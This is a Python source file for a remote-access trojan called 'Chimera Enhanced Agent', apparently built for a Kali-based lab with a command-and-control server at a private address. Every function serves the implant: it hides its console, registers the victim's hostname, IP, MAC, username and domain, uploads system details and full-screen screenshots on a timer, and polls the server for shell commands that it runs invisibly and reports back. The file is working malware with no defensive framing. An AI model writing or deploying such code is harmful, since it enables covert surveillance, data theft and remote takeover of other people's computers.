
#!/usr/bin/env python3
"""
Chimera Enhanced Agent - Sends detailed system info
"""
import os
import sys
import time
import json
import socket
import subprocess
import urllib.request
import ctypes
import base64
import psutil
import platform
from datetime import datetime

KALI_IP = "10.0.2.8"
C2_URL = f"http://{KALI_IP}:8080"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_victim_id():
    hostname = socket.gethostname()
    ip = get_local_ip()
    mac = get_mac()
    return f"{hostname}_{mac.replace(':', '')}_{ip.replace('.', '_')}"

def get_mac():
    try:
        import uuid
        mac = uuid.getnode()
        return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    except:
        return "00-00-00-00-00-00"

def get_detailed_info():
    info = {
        "hostname": socket.gethostname(),
        "ip": get_local_ip(),
        "mac": get_mac(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "cpu": platform.processor(),
        "memory": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "disk": [],
        "username": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
        "domain": os.environ.get('USERDOMAIN', 'Unknown')
    }
    
    # Disk info
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info["disk"].append({
                "mount": part.mountpoint,
                "total": f"{round(usage.total / (1024**3), 2)} GB",
                "used": f"{round(usage.used / (1024**3), 2)} GB",
                "free": f"{round(usage.free / (1024**3), 2)} GB"
            })
        except:
            pass
    
    return info

def send_detailed_info():
    info = get_detailed_info()
    data = {
        "victim_id": get_victim_id(),
        "type": "system_info",
        "content": info
    }
    try:
        req = urllib.request.Request(
            f"{C2_URL}/api/collect",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        return True
    except:
        return False

def capture_screenshot():
    try:
        from PIL import ImageGrab
        import io
        screenshot = ImageGrab.grab(all_screens=True)
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        return base64.b64encode(buffered.getvalue()).decode('utf-8')
    except:
        return None

def send_screenshot():
    img = capture_screenshot()
    if not img:
        return False
    data = {
        "victim_id": get_victim_id(),
        "type": "screenshot",
        "content": {
            "image": img,
            "size": len(img),
            "timestamp": datetime.now().isoformat()
        }
    }
    try:
        req = urllib.request.Request(
            f"{C2_URL}/api/collect",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=10)
        return True
    except:
        return False

def register():
    info = get_detailed_info()
    data = {
        "victim_id": get_victim_id(),
        "hostname": info["hostname"],
        "ip": info["ip"],
        "mac": info["mac"],
        "os": info["os"],
        "os_version": info["os_version"],
        "architecture": info["architecture"],
        "cpu": info["cpu"],
        "memory": info["memory"],
        "disk": json.dumps(info["disk"]),
        "username": info["username"],
        "domain": info["domain"]
    }
    try:
        req = urllib.request.Request(
            f"{C2_URL}/api/register",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=10)
        return True
    except:
        return False

def execute_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.stdout if result.stdout else result.stderr
    except:
        return "[Command failed]"

def get_commands():
    try:
        data = {"victim_id": get_victim_id()}
        req = urllib.request.Request(
            f"{C2_URL}/api/get_command",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        result = json.loads(response.read().decode())
        if result.get('has_command'):
            command = result.get('command')
            command_id = result.get('command_id')
            output = execute_command(command)
            result_data = {
                "victim_id": get_victim_id(),
                "command_id": command_id,
                "result": output
            }
            req_result = urllib.request.Request(
                f"{C2_URL}/api/command_result",
                data=json.dumps(result_data).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req_result, timeout=10)
            return True
        return False
    except:
        return False

def main():
    try:
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass
    
    register()
    send_detailed_info()
    send_screenshot()
    
    counter = 0
    while True:
        try:
            if counter % 5 == 0:
                get_commands()
            if counter % 30 == 0:
                send_screenshot()
            if counter % 60 == 0:
                send_detailed_info()
            time.sleep(1)
            counter += 1
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()

